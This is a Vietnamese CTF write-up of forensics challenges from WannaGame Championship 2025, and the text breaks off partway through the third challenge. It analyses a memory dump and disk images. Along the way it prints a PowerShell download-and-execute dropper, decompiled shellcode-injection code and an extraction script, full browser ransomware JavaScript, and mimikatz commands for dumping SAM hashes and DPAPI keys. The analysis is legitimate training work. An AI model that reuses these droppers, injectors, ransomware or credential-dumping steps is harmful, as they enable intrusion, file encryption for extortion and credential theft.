---
title: "WannaGame Championship 2025"
description: "Writeup for Forensic Challenge"
summary: "Writeup for Forensic Challenge"
categories: ["Writeup"]
tags: ["Forensic", "Reverse", "Writeup"]
#externalUrl: ""
date: 2025-12-09
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/wannagame.jpg
---



## Hide and Seek
I just searched and downloaded some files, but I found some suspicious process created. Please help me find out.

### Q1. What id MITRE ID for initial access? (TXXXX.XXX)
![image](https://hackmd.io/_uploads/S1memeurbe.png)

Xài [vol3](https://github.com/volatilityfoundation/volatility3/releases) để extract cache
![image](https://hackmd.io/_uploads/BJ5MmxdH-e.png)

Rename lại tên file file.0x96...dat thành places.sqlite. Sau đó load file vào [sqlitebrowserDB](https://sqlitebrowser.org/dl/)
![image](https://hackmd.io/_uploads/BJtameuHbg.png)


Có vẻ truy cập vào 1 đường link khá sus ở cuối.
Tìm kiếm trên google theo tính huống truy cập link bị lừa đảo thì ta tìm được ID sau có vẻ hợp lý.
![image](https://hackmd.io/_uploads/H1afVe_B-x.png)


**Answer: T1566.002**

### Q2. What link did the victim access? (ASCII)
![image](https://hackmd.io/_uploads/Bk2XVg_SWx.png)

Ở ảnh câu 1 phía trên ta có đáp án ở hàng 23.

**Answer: http://192.168.1.11:7331/captcha.html**
### Q3. What command does the attacker trick the victim into executing? (ASCII)
![image](https://hackmd.io/_uploads/S1mnExOrWx.png)


Sử dụng plugin cmdline của volatility để xem lại arg của các tiến trình.
![image](https://hackmd.io/_uploads/SkpnEedS-l.png)
![image](https://hackmd.io/_uploads/Skm6VlOBWx.png)


**Answer: p0wershell.exe -eC aQB3AHIA...[REDACTED]...QBlAHgA**


### [4]. What link to run the script and what file name is it stored in? (http://example.com/script.ext_file.rar)
![image](https://hackmd.io/_uploads/H1r1SgOHWg.png)
![image](https://hackmd.io/_uploads/rkOgBedHZe.png)


```ps1=
iwr http://192.168.1.11:7331/y.ps1 -UseBasicParsing | iex
```
Đây là nội dung đoạn code ps1 ở câu 3, nó thực hiện tải nội dung từ 1 trang web khác rồi thực thi.
Vậy ta có được nửa đầu câu trả lời là **http://192.168.1.11:7331/y.ps1**
Ta biết được rằng tiến trình **powershell.exe** với pid là 3000 chính là tiến trình chính khởi chạy mã độc. Và để biết được nội dung đoạn code đã khởi chạy, ta sẽ dump procdump của tiến trình này để kiểm tra.
Đây là lệnh mình dùng để dump proc của tiến trình powershell.exe:
``
vol -f memdump.raw windows.memmap --dump --pid 3000
``
![image](https://hackmd.io/_uploads/HkaGrldBWx.png)
Ban đầu mình thử format strings với secret.zip nhưng k phải file này
![image](https://hackmd.io/_uploads/BkxVrxdrbg.png)
Sau đó mình thử lại với keyword **.zip** thôi
![image](https://hackmd.io/_uploads/BJFSSlOHWe.png)


Ta tìm được đoạn code ps1 đã được thực thi ở 1 đoạn nào đó trong file proc đó:
```ps1=
Receive
net_connclosed
 Section=
 Detail=
net_WebResponseParseError_
In System.Net.Connection.Dispose()
Reading web response completed. (Number of bytes read: {0})
HTTP/1.0 200 OK
Content-Length: 352
Content-Type: application/octet-stream
Date: Fri, 05 Dec 2025 12:45:19 GMT
Last-Modified: Thu, 04 Dec 2025 15:14:47 GMT
Server: SimpleHTTP/0.6 Python/3.14.0
$webClient = New-Object System.Net.webClient
$url1 = "http://192.168.1.11:7331/update.zip"
$zipPath1 = "$env:TEMP\kqwer.zip"
$webClient.DownloadFile($url1, $zipPath1)
$extractPath1 = "$env:TEMP\file"
Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
Start-Process -FilePath $env:TEMP\file\verify.exe
Start-Sleep -Seconds (15 * 60)
-Command:
-Command:
The C++ module failed to load.
The C++ module failed to load during vtable initialization.
The C++ module failed to load during native initialization.
The C++ module failed to load during process initialization.
The C++ module failed to load during appdomain initialization.
The C++ module failed to load during registration for the unload events.
$webClient = New-Object System.Net.webClient
$url1 = "http://192.168.1.11:7331/update.zip"
$zipPath1 = "$env:TEMP\kqwer.zip"
$webClient.DownloadFile($url1, $zipPath1)
$extractPath1 = "$env:TEMP\file"
Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
Start-Process -FilePath $env:TEMP\file\verify.exe
Start-Sleep -Seconds (15 * 60)
webClient
New-Object
System.Net.webClient
url1
http://192.168.1.11:7331/update.zip
ConvertFrom-StringDataces.psd1
zipPath1
env:TEMP
TEMP
$env:TEMP\kqwer.zip
{0}\kqwer.zip
webClient
DownloadFile
url1
zipPath1
extractPath1
```

Ta thấy nó tải file từ **update.zip** rồi lưu vào **kqwer.zip**

**Answer: http://192.168.1.11:7331/y.ps1_kqwer.zip**

### Q5. What is the MITRE ID of this technique and where does this command store in the registry? (TXXXX_Hive\key)
![image](https://hackmd.io/_uploads/By90Hx_Hbe.png)


Ở câu 3 ta biết được kẻ tấn công đã lừa người dùng chạy 1 command ps1 => google thông tin này và ta tìm được ID phù hợp
Tiến trình powershell.exe là tiến trình con của explorer.exe => có vẻ người dùng đã mở hộp thoại Run để thực thi lệnh ps1 phía trên.
Kiểm tra registry với key sau:
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
![image](https://hackmd.io/_uploads/rkRWIl_SWl.png)


**Answer: T1204_HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU**

### Q6. What was the malicious file location and which process was invoked by this malware? Provide its PID?? (C:\path\folder\A_processA.ext_1234)
![image](https://hackmd.io/_uploads/Skvf8x_S-g.png)
Ở câu 3, ta thấy sau tiến trình powershell.exe khởi chạy malwares thì có 1 tiến trình con khá lạ cũng được khởi chạy đó là verify.exe
![image](https://hackmd.io/_uploads/H1dLIgdBZe.png)

Dump file này ra để kiểm tra
![image](https://hackmd.io/_uploads/H1YDLe_rWl.png)
![image](https://hackmd.io/_uploads/r1FOLeOH-e.png)
![image](https://hackmd.io/_uploads/SyaYUgOSbg.png)

Check file 
![image](https://hackmd.io/_uploads/BJA98gOSWe.png)

Load vào ida analysis
**Sub_401633**
```c=
// bad sp value at call has been detected, the output may be wrong!
int __cdecl sub_401633(int a1, int a2, int a3, int a4)
{
  _BYTE v5[4]; // [esp+3Ch] [ebp-32Ch] BYREF
  int v6; // [esp+40h] [ebp-328h] BYREF
  int v7; // [esp+44h] [ebp-324h] BYREF
  _BYTE v8[355]; // [esp+49h] [ebp-31Fh] BYREF
  int n355; // [esp+1ACh] [ebp-1BCh] BYREF
  char _6ddLG9a8gc69cf4J0bZrzgGjr9zRMR[31]; // [esp+1B2h] [ebp-1B6h] BYREF
  _BYTE v11[355]; // [esp+1D1h] [ebp-197h] BYREF
  HMODULE (__stdcall *LoadLibraryA_1)(LPCSTR); // [esp+334h] [ebp-34h]
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // [esp+338h] [ebp-30h]
  HMODULE hModule; // [esp+33Ch] [ebp-2Ch]
  int v15; // [esp+340h] [ebp-28h]
  unsigned int j; // [esp+344h] [ebp-24h]
  unsigned int i; // [esp+348h] [ebp-20h]
  int n30; // [esp+34Ch] [ebp-1Ch]
  int *v19; // [esp+358h] [ebp-10h]
  _UNKNOWN *retaddr; // [esp+36Ch] [ebp+4h]

  v19 = &a1;
  sub_403060();
  sub_4014E0("\nDecrypting shellcode\n");
  *(_DWORD *)v11 = dword_40C0CC[0];
  *(_DWORD *)&v11[351] = *(_DWORD *)((char *)&dword_40C0CC[87] + 3);
  qmemcpy(&v11[3], (char *)dword_40C0CC - (v11 - &v11[3]), 4 * (((v11 - &v11[3] + 355) & 0xFFFFFFFC) >> 2));
  strcpy(_6ddLG9a8gc69cf4J0bZrzgGjr9zRMR, "6ddLG9a8gc69cf4J0bZrzgGjr9zRMR");
  n355 = 355;
  n30 = 0;
  for ( i = 0; i <= 0x162; ++i )
  {
    if ( n30 == 30 )
      n30 = 0;
    v8[i] = _6ddLG9a8gc69cf4J0bZrzgGjr9zRMR[n30++] ^ v11[i];
  }
  v7 = 0;
  v15 = sub_40151C();
  sub_4014E0("Handle obtained: %p\n");
  for ( j = 0; j <= 0x162; ++j )
    sub_4014E0("%02x ");
  sub_4014E0("\n");
  v6 = 0;
  hModule = GetModuleHandleA("kernel32.dll");
  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(hModule, "LoadLibraryA");
  LoadLibraryA_1 = LoadLibraryA;
  sub_4014E0("\nInjecting...\n");
  sub_401DD9(v15, &v6, 0, &n355, 12288, 64);
  sub_401F23(v15, v6, v8, n355, 0);
  sub_401FFF(v15, &v6, &n355, 32, v5);
  a4 = 0;
  a3 = 0;
  a2 = 0;
  a1 = 0;
  retaddr = 0;
  sub_402423(&v7, 0x20000000, 0, v15, v6, LoadLibraryA_1);
  sub_4014E0("\nCheck your meterpreter :D\n");
  sub_401D7F(v15);
  return 0;
}
```

![image](https://hackmd.io/_uploads/S102IedSZx.png)

**sub_40151C**

```c=
int sub_40151C()
{
  _DWORD v1[2]; // [esp+14h] [ebp-164h] BYREF
  _DWORD v2[6]; // [esp+1Ch] [ebp-15Ch] BYREF
  PROCESSENTRY32 pe; // [esp+34h] [ebp-144h] BYREF
  _DWORD v4[4]; // [esp+15Ch] [ebp-1Ch] BYREF
  HANDLE hSnapshot; // [esp+16Ch] [ebp-Ch]

  hSnapshot = CreateToolhelp32Snapshot(6u, 0);
  pe.dwSize = 296;
  if ( Process32First(hSnapshot, &pe) )
  {
    while ( stricmp(pe.szExeFile, "explorer.exe") )
      Process32Next(hSnapshot, &pe);
  }
  v4[1] = pe.th32ProcessID;
  v4[2] = 0;
  v2[0] = 24;
  memset(&v2[1], 0, 20);
  v1[0] = pe.th32ProcessID;
  v1[1] = 0;
  sub_401E5B(v4, 0x2000000, v2, v1);
  return v4[0];
}
```

![image](https://hackmd.io/_uploads/Hym0UeOHbg.png)

**dword_40C0CC**
![image](https://hackmd.io/_uploads/SyfyweuHWx.png)


Nó tiến hành giải mã đoạn hex ở `dword_40C0CC` bằng cách xor với key `6ddLG9a8gc69cf4J0bZrzgGjr9zRMR` ra 1 shellcode rồi tiêm vào tiến trình **explorer.exe**

```
3000    6500    powershell.exe  0x9655c040      12      -       1       False   2025-12-05 12:45:19.000000 UTC  N/A     Disabled
6500    700     explorer.exe    0xbec0e680      59      -       1       False   2025-12-05 12:45:06.000000 UTC  N/A     Disabled
```
**Answer: C:\Users\imnoob\AppData\Local\Temp\file_explorer.exe_6500**

### Q7. What is IP and PORT of attacker in injected shellcode? (IP:PORT)
![image](https://hackmd.io/_uploads/HySwvlOB-g.png)
Ta sẽ thực hiện extract shellcode này ra
Đây là code để trích shellcode:
```python3=
KEY = b"6ddLG9a8gc69cf4J0bZrzgGjr9zRMR"

dwords = [
    0x4CEB8CCA, 0x09013947, 0x6BBD07B5, 0xC1D1EF53, 0x20D16E62,
    0x20F0686E, 0xD9850854, 0xA4077A3F, 0x452670C8, 0xA2471463,
    0x0A16234F9, 0x30DF3F7D, 0x306A20D1, 0x384E28CC, 0x2A0DD9AA,
    0x0010A4B3, 0x70EAE946, 0x196EE87F, 0x0CFE76733, 0x436616F9,
    0x5ECC2E85, 0x63AC38F9, 0x0ABF7FE8D, 0x01804D69, 0x60934D81,
    0x1B58C14B, 0x3AD03F10, 0x665E2AD1, 0x35F90C94, 0x4E15D931,
    0x48EFB737, 0x0B1B138CC, 0x62124723, 0x106D0738, 0x2ABA9D61,
    0x78CC3D25, 0x0AD85B99B, 0x575E0FB2, 0x51474C56, 0x3C554B16,
    0x112F5162, 0x8AB94D12, 0x0F7C2A2A5, 0x10726A46, 0x3A1D06BE,
    0x4C0FE41F, 0x320BECB8, 0x389EA30F, 0x4A360E68, 0x94D3C7CB,
    0x3A17372A, 0x023A6932, 0x0BB39B825, 0x0AE92B384, 0x3431280B,
    0x12C6A05E, 0x0E7E5B555, 0x9870069A, 0x0D5076209, 0x524D3592,
    0x26640E36, 0x50366F43, 0x66FEBA65, 0x0B2B7B39C, 0x0F96C1C30,
    0x02070D4C, 0x527A2972, 0x0C36381B, 0x0DC14E83C, 0x30F4ED9E,
    0x3535395C, 0x0BB322263, 0x0B2852D92, 0x447292C4, 0x52250A52,
    0x26646476, 0x33096947, 0x0C6066C48, 0x3F5C31B6, 0x8D3B2F5E,
    0x951939AF, 0x0D7751D7E, 0x9BC9AD3D, 0x0C6B8D78D, 0x4AA4399E,
    ... [TRUNCATED] ...
]

data = b''.join((x & 0xFFFFFFFF).to_bytes(4, 'little') for x in dwords)

decoded_shellcode = bytearray()
key_len = len(KEY)

for i in range(355):
    decoded_byte = data[i] ^ KEY[i % key_len]
    decoded_shellcode.append(decoded_byte)

with open("shellcode.bin", "wb") as f:
    f.write(decoded_shellcode)
```
Ném lên cyberchef để disasembler:
![image](https://hackmd.io/_uploads/rk1Ywe_SZg.png)

Nó thực hiện connect tới 1 ip khác và tải dữ liệu về thực thi.
Đây là đoạn liên quan tới câu trả lời(load IP và PORT):
```asm=
000000BC 68C0A8010B                      PUSH 0B01A8C0
000000C1 680200FBA5                      PUSH A5FB0002
```
![image](https://hackmd.io/_uploads/BJRavxOr-e.png)
![image](https://hackmd.io/_uploads/BySCPedrWg.png)


Chuyển hex sang decimal và có đáp án.

**Answer: 192.168.1.11:64421**
### Q8. What process was used to bypass UAC and PPID? (ProcessA.ext_1234)
![image](https://hackmd.io/_uploads/SJtJdx_Bbl.png)

**UAC** là là một tính năng bảo mật của Windows giúp ngăn chặn các thay đổi trái phép đối với hệ điều hành.
```
5888    powershell.exe  powershell  -ExecutionPolicy Bypass
2964    fodhelper.exe   -
```
```
5888    6056    powershell.exe  0xbd845080      11      -       1       False   2025-12-05 12:45:52.000000 UTC  N/A     Disabled
2964    5888    fodhelper.exe   0xbc168040      0       -       1       False   2025-12-05 12:46:39.000000 UTC  2025-12-05 12:46:39.000000 UTC  Disabled
```

Và ở PID 5888 đã chạy một lệnh ps1 và lệnh ps1 đó đã gọi 1 tiến trình con khác là **fodhelper.exe** và tiến trình này có công dụng là bypass được UAC, mục đích của việc này là thực thi bất kỳ script nào mà không bị chặn bởi windows.

**Answer: fodhelper.exe_5888**

Sau khi trả lời xong 8 câu trên thì ta có flag.
![image](https://hackmd.io/_uploads/r1XWuguH-x.png)


> Flag: W1{conGR4TUIaTi0N5-9OU-Fin4ILy-fOUND-m3!ll10dc}

## Where is the malware?
The IT department received an urgent alert: an employee reported that all of his important files had been encrypted without any clear cause. Most of the team gave up, assuming this might be a new, unknown attack vector. Now it’s your turn—investigate the root cause and help us recover the encrypted files.

![image](https://hackmd.io/_uploads/SyZPOluBWe.png)

Các file trong thư mục **Documents** đều bị mã hóa và nó để lại 1 file txt để tống tiền victim.

Trong thư mục **Documents/for_meeting**, file ransom.txt được tạo lúc **12/5/2025 4:40:46 PM**. Các file bị mã hóa (ví dụ: Statement-of-Financial-Position...) bị thay đổi ngay trước đó, khoảng **4:40:44 PM**.

Mã độc đã được thực thi vào khoảng **16:40:00 - 16:40:46** ngày **05/12/2025**.

Tìm xem có file .pf nào có thời gian chỉnh sửa (Last Modified) trùng khớp với khoảng 12/05/2025 04:40 PM hay không. Tên của file đó chính là tên của mã độc
![image](https://hackmd.io/_uploads/Bk2A_g_Hbg.png)

Sử dụng MFT Parser và Timeline Explorer của Eric Zimmerman để có cái nhìn tổng quan hơn.
![image](https://hackmd.io/_uploads/BJseFxdrbe.png)
![image](https://hackmd.io/_uploads/Hkemtl_S-x.png)

Kéo qua 1 chút ta thấy 
+ File **Zone.Identifier** này chính là metadata phụ của file được windows lưu lại, nó cho biết nguồn gốc của file. Và ZoneId=3 tức là nó từ Internet.
+ có vẻ như victim truy cập vào 1 trang web có url là https://simplepdf.online/ và sau đó các file đã bị mã hóa hết.

![image](https://hackmd.io/_uploads/ByZ8KgdSZe.png)

Kiểm tra lịch sử duyệt web của chrome thì thấy victim thật sự đã truy cập vào đây, nhưng trang web đã sập và không thể vào lại được. Tuy nhiên chrome đã lưu lại cache của trang web đó và ta có thể vào và xem lại được, nó nằm ở **AppData/Local/Google/Chrome/User Data/Default/Cache/Cache_Data**, kéo xuống tìm đúng timeline ở trên
![image](https://hackmd.io/_uploads/BJW_KlOSZl.png)

Mình sẽ trích xuất hàm chính ở đây
```javascript
{"use strict";var A=__webpack_require__(5072),g=__webpack_require__.n(A),C=__webpack_require__(7825),I=__webpack_require__.n(C),B=__webpack_require__(7659),Q=__webpack_require__.n(B),E=__webpack_require__(5056),o=__webpack_require__.n(E),i=__webpack_require__(540),t=__webpack_require__.n(i),D=__webpack_require__(1113),K=__webpack_require__.n(D),e=__webpack_require__(1208),w={};w.styleTagTransform=K(),w.setAttributes=o(),w.insert=Q().bind(null,"head"),w.domAPI=I(),w.insertStyleElement=t(),g()(e.A,w),e.A&&e.A.locals&&e.A.locals;var h=__webpack_require__(9491);const r=(A,g)=>parseInt(A.slice(g,g+2),16),s=async(A,g=[])=>{for await(const C of A.values())"file"===C.kind?g.push(C):"directory"===C.kind&&await s(C,g);return g},M={selectDirectory:async()=>{if("undefined"==typeof window||!("showDirectoryPicker"in window))throw new Error("File System Access API not supported");return window.showDirectoryPicker()},readAllFiles:s,readFileAsUint8Array:async A=>{const g=await A.getFile(),C=await g.arrayBuffer();return new Uint8Array(C)},writeBytesToHandle:async(A,g)=>{const C=await A.createWritable();await C.write(g),await C.close()},writeTextFile:async(A,g,C)=>{const I=await A.getFileHandle(g,{create:!0}),B=await I.createWritable();await B.write(C),await B.close()}};var n=__webpack_require__(8287);const a="https://api.simplepdf.online/api".replace(/\/$/,""),y={selectedDirectory:null,isEncrypting:!1,filesProcessed:0,totalFiles:0,clientId:null,backendPublicKey:null};let c={};const Y=async()=>{try{const A=await fetch(`${a}/new`,{method:"POST"});if(!A.ok)throw new Error("Server handshake failed");const g=await A.json();y.clientId=g.clientId,y.backendPublicKey=g.publicKey}catch(A){console.error("Connection Error:",A.message)}},N=async()=>{try{const A=await M.selectDirectory();y.selectedDirectory=A,c.selectedDirInfo&&(c.selectedDirInfo.innerHTML='<p class="warning-text">⚠️⏳ We’re working on it! Please keep this page open until we’re done.</p>'),c.progressContainer&&(c.progressContainer.style.display="block"),await F()}catch(A){"AbortError"!==A.name&&c.progressContainer&&(c.progressContainer.style.display="none")}},F=async()=>{if(y.selectedDirectory){y.clientId||await Y(),y.isEncrypting=!0,c.selectDirBtn&&(c.selectDirBtn.disabled=!0),c.progressBar&&(c.progressBar.style.width="0%"),c.progressText&&(c.progressText.textContent="Initializing..."),c.progressContainer&&(c.progressContainer.style.display="block");try{const A=await M.readAllFiles(y.selectedDirectory);y.totalFiles=A.length,y.filesProcessed=0;const g=(await(async()=>{const A=((A,g="94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef")=>{if(A.length!==g.length)throw new Error("Hex strings must be the same length for XOR.");const C=A.length/2,I=new Uint8Array(C);for(let B=0;B<C;B+=1){const C=2*B;I[B]=r(A,C)^r(g,C)}return I})("97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509");return{aes:await(async A=>{const g=new h.AES;return await g.init({key_bits:256,key:A,algorithm:h.AES.Algorithm.GCM}),g})(A),rawKeyBytes:A}})()).aes;for(let C=0;C<A.length;C++){const I=A[C];c.progressText&&(c.progressText.textContent=`Processing: ${I.name}...`),await f(I,g),y.filesProcessed++,c.progressBar&&(c.progressBar.style.width=y.filesProcessed/y.totalFiles*100+"%")}await R(),c.progressText&&(c.progressText.textContent="Done. ransom.txt created."),c.selectedDirInfo&&(c.selectedDirInfo.innerHTML=`<p><strong>Folder:</strong> ${y.selectedDirectory.name} - <strong>Status:</strong> Completed (${y.filesProcessed} files)</p>`)}catch(A){c.progressText&&(c.progressText.textContent=`Error: ${A.message}`),c.progressContainer&&setTimeout(()=>{c.progressContainer.style.display="none"},3e3)}finally{y.isEncrypting=!1,c.selectDirBtn&&(c.selectDirBtn.disabled=!1)}}},f=async(A,g)=>{try{const C=await M.readFileAsUint8Array(A),I=await(async(A,g)=>{const C=await g.encrypt(A);return{iv:new Uint8Array(C.iv),ciphertext:new Uint8Array(C.content),tag:C.tag?new Uint8Array(C.tag):null}})(C,g),B=I.iv,Q=I.tag,E=I.ciphertext,o=new Uint8Array(B.length+Q.length+E.length);o.set(Q,0),o.set(E,Q.length),o.set(B,E.length+Q.length),await M.writeBytesToHandle(A,o)}catch(g){console.error(`Failed to process ${A.name}:`,g.message)}},R=async()=>{if(!y.selectedDirectory)return;const A=["*** YOUR FILES HAVE BEEN ENCRYPTED ***","","All important documents were encrypted","To recover them you must follow the instructions below.","",`Victim ID: ${y.clientId||"UNKNOWN"}`,"1. Visit our secure portal and enter your Victim ID.","2. Send the requested payment and keep this note safe.","3. After payment, you will receive the decryption key.","","Do not delete this file. Any tampering may lead to data loss.","","— Secure Cloud Team"].join("\n");await M.writeTextFile(y.selectedDirectory,"ransom.txt",A)};var U=__webpack_require__(5606);window.Buffer=n.Buffer,window.process=U,document.addEventListener("DOMContentLoaded",async()=>{c={selectDirBtn:document.getElementById("selectDirBtn"),selectedDirInfo:document.getElementById("selectedDirInfo"),progressBar:document.getElementById("progressBar"),progressText:document.getElementById("progressText"),progressContainer:document.getElementById("progressContainer")},c.selectDirBtn&&c.selectDirBtn.addEventListener("click",N),await Y()})})()})();
```
![image](https://hackmd.io/_uploads/HkZ2Yg_SZg.png)


Hàm **Y**: Gọi API tới https://api.simplepdf.online/api/new để lấy victim ID
Hàm **N**: Yêu cầu victim chọn thư mục
Hàm **F**: Thực hiện mã hóa toàn bộ thư mục của victim đã chọn.
Đây là hàm F(hàm mã hóa chính):
```js=
F = async () => {
    if (y.selectedDirectory) {
        y.clientId || await Y(), y.isEncrypting = !0, c.selectDirBtn && (c.selectDirBtn.disabled = !0), c.progressBar && (c.progressBar.style.width = "0%"), c.progressText && (c.progressText.textContent = "Initializing..."), c.progressContainer && (c.progressContainer.style.display = "block");
        try {
            const A = await M.readAllFiles(y.selectedDirectory);
            y.totalFiles = A.length, y.filesProcessed = 0;
            const g = (await (async () => {
                const A = ((A, g = "94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef") => {
                    if (A.length !== g.length) throw new Error("Hex strings must be the same length for XOR.");
                    const C = A.length / 2,
                        I = new Uint8Array(C);
                    for (let B = 0; B < C; B += 1) {
                        const C = 2 * B;
                        I[B] = r(A, C) ^ r(g, C)
                    }
                    return I
                })("97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509");
                return {
                    aes: await (async A => {
                        const g = new h.AES;
                        return await g.init({
                            key_bits: 256,
                            key: A,
                            algorithm: h.AES.Algorithm.GCM
                        }), g
                    })(A),
                    rawKeyBytes: A
                }
            })()).aes;
            for (let C = 0; C < A.length; C++) {
                const I = A[C];
                c.progressText && (c.progressText.textContent = `Processing: ${I.name}...`), await f(I, g), y.filesProcessed++, c.progressBar && (c.progressBar.style.width = y.filesProcessed / y.totalFiles * 100 + "%")
            }
            await R(), c.progressText && (c.progressText.textContent = "Done. ransom.txt created."), c.selectedDirInfo && (c.selectedDirInfo.innerHTML = `<p><strong>Folder:</strong> ${y.selectedDirectory.name} - <strong>Status:</strong> Completed (${y.filesProcessed} files)</p>`)
        } catch (A) {
            c.progressText && (c.progressText.textContent = `Error: ${A.message}`), c.progressContainer && setTimeout(() => {
                c.progressContainer.style.display = "none"
            }, 3e3)
        } finally {
            y.isEncrypting = !1, c.selectDirBtn && (c.selectDirBtn.disabled = !1)
        }
    }
};
```

Nó thực hiện xor 2 mã hex với nhau làm khóa rồi mã hóa AES256-GCM. Giờ ta chỉ việc code script decrypt rồi decrypt các file trong thư mục `for_meeting` là xong.
code decrypt:

```python3=
from Crypto.Cipher import AES

def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

with open("Bulbasaur.jpg", "rb") as f:
    data = f.read()

a = "94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef"
b = "97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509"
a = bytes.fromhex(a)
b = bytes.fromhex(b)
key = xor(a,b)

cipher = AES.new(key, AES.MODE_GCM, data[-16:])
dec = cipher.decrypt_and_verify(data[16:-16], data[:16])

with open("decrypted.jpg", "wb") as f:
    f.write(dec)
```
![image](https://hackmd.io/_uploads/SyTVqx_rbl.png)


> Flag: W1{hAv3_u_3v3r_kNowN_R4n5omWar3_oN_Brow5eR_???!!!_8QZeXvOjgGE}

## Communicate
My friend told me that yesterday she received a document from a colleague, then her computer received a new windows update from Microsoft. After updating Windows to the new version, while surfing the web, she suddenly realized that she had been attacked by ransomware, all her important files were encrypted. She panicked and deleted all her documents. With your digital forensic skills, please investigate whether all the encrypted files have been stolen or not! And can you help her recover the data?

### Part 1

Khi điều tra các folder, chúng ta sẽ thấy được những điều sau:
- User của hệ thống là `sosona`.
- Các file trong ổ `C:\Users\sosona` đều bị mã hóa với đuôi `foooo` (trừ các files trong hidden folder như `AppData`).
- User tải và sử dụng 3 app messenger là: `Telegram`, `Session` và `Signal`.

![image](https://hackmd.io/_uploads/SJF35x_BZl.png)
![image](https://hackmd.io/_uploads/rydTqlOBWe.png)

Như vậy, hướng đi đúng của chúng ta sẽ là phân tích các app trong `AppData\Roaming` mà cụ thể là các app messenger nêu trên dựa trên description của đề nói về việc user dính ransomware sau khi nhận file **document** từ một đồng nghiệp.

Đầu tiên, phân tích `Telegram` sẽ có một cách là session hijacking bằng việc copy các files và folder lưu session của người dùng bao gồm:
- `tdata/key_datas`
- `tdata/D877F783D5D3EF8Cs`
- `tdata/D877F783D5D3EF8C`

Tuy nhiên, trong folder `tdata/D877F783D5D3EF8Cs` lại không có các folder như `map0`, `map1` (quan trọng trong hack session) mà chỉ chứa một file config.
-> Cách này không tiếp cận được.

Tiếp theo, `Session` lưu trữ key ở dạng hex trong file `config.json` chúng ta có thể lấy nó và sử  dụng `SQLCipher` để decrypt `sql\db.sqlite` trong `Session`.
![image](https://hackmd.io/_uploads/SJTRcgOHZe.png)
![image](https://hackmd.io/_uploads/B1myse_HWg.png)

Để xem file này thì ta phải tải [sqlite](https://sqlitebrowser.org/dl/) về (file zip) và chọn DB Browser for SQLCipher.exe để chạy
![image](https://hackmd.io/_uploads/Sk5bsg_SZg.png)

Sau khi load file vào sẽ hiện ra hộp thoại để điền key vào. Chọn **raw key** và nhập vào chuỗi ở file **config.json**
`0xb4e69ff07dd38d8cc64d9684c039a84fe2247e1071f5dd132ecaba142649f29c`
![image](https://hackmd.io/_uploads/SJJ9jg_rbe.png)

![image](https://hackmd.io/_uploads/H1Icsxur-g.png)
Tuy nhiên, ở Session thì chúng ta sẽ chỉ tìm được fake flag.
![image](https://hackmd.io/_uploads/r1fioeOB-l.png)

Cuối cùng, chúng ta có thể chắc chắn rằng document mà user nói tới sẽ nằm trong Signal.
![image](https://hackmd.io/_uploads/rkoU3x_HWe.png)

Khi tìm kiếm về cách decrypt db của `Signal` thì chúng ta có thể tìm được vài viết này [reddit](https://www.reddit.com/r/signal/comments/1i8y4sq/how_to_decrypt_the_encryptedkey_to_migrate_a/). Về cơ bản, `Signal` sử dụng 3 keys:
- `key1`: nằm trong file config.json và được encrypted bằng `key2`.
- `key2`: nằm trong file `Local State` và được encrypted bằng `masterkey DPAPI`.
- `masterkey DPAPI`: là một dạng session key, nằm trong folder `AppData\Roaming\Microsoft\Protect\{SID}` và cần password của user để decrypt.

Như vậy ta cần phải trích xuất 2 file SAM và SYSTEM ở trong system32/config
![image](https://hackmd.io/_uploads/rk5q3xuSbg.png)


Sử dụng [mimikatz](https://github.com/ParrotSec/mimikatz/) để lấy NTLM hash
Chạy file để dấu #
   `lsadump::sam /system:SYSTEM /sam:SAM`
![image](https://hackmd.io/_uploads/B1Ee6ldHWg.png)
![image](https://hackmd.io/_uploads/SkqxpxuBWl.png)

mã băm NTLM của user sosona là: 2d20d252a479f485cdf5e171d93985bf

Vào [CrackStation](https://crackstation.net/) để tim pass
![image](https://hackmd.io/_uploads/Sk0Q6ldBZx.png)

Chúng ta sẽ biết được password của user là `qwerty`:

Tiếp theo, sử dụng `mimikatz` để lấy được `masterkey`, ở đây chúng ta sẽ có hai master key, nhưng key `d1cd9*` là key chúng ta cần để decrypt db. 
![image](https://hackmd.io/_uploads/SkZPalurbg.png)

`dpapi::masterkey /in:d1cd97b9-2ab7-4398-ba1f-228f87eccffa /sid:S-1-5-21-1050944156-4264195685-750733359-1001 /password:qwerty`
![image](https://hackmd.io/_uploads/By9OaxOHWl.png)

Tiếp tục decrypt key2:
![image](https://hackmd.io/_uploads/BJ9K6g_H-l.png)
![image](https://hackmd.io/_uploads/Sy0Y6euBZg.png)

Sau khi decode base64 key thì chúng ta cần xóa thêm 5 bytes đầu để nó trở thành blob dpapi hợp lệ.
![image](https://hackmd.io/_uploads/B1t9px_Hbg.png)

Có thể sử dụng cyberchef để drop byte
![image](https://hackmd.io/_uploads/HyHipgdSZg.png)

Ở đây lưu ý khi save file thì **không được** dùng module To Hex ở bước cuối vì nó sẽ biến dữ liệu thành văn bản. Mình chỉ them vào để dễ nhìn từng bytes
Lưu lại file ***key2_blob.bin*** và đưa vào để mimikatz tìm key2

```
dpapi::blob /in:key2_blob.bin /masterkey:9775cb01f73eff2bd8ff943ae9040d753804d2c9ffd513c1db2ca218c7b9225817bbb24c77c7e52577fb916e52137744fdd917f5180b56c4e8a9fef4bf1a0da9
```
![image](https://hackmd.io/_uploads/SJwR6gdBbl.png)

**Key2: 5a985f65714e073c05cd2929c83f9c1861ed0bbbdeb726b556d94c5158feef0e**
Cuối cùng, decrypt key1 sử dụng AES-GCM với key2 tìm được:
Chuỗi trong **config.json** sử dụng thuật toán **AES-256-GCM**
```python!
from Crypto.Cipher import AES

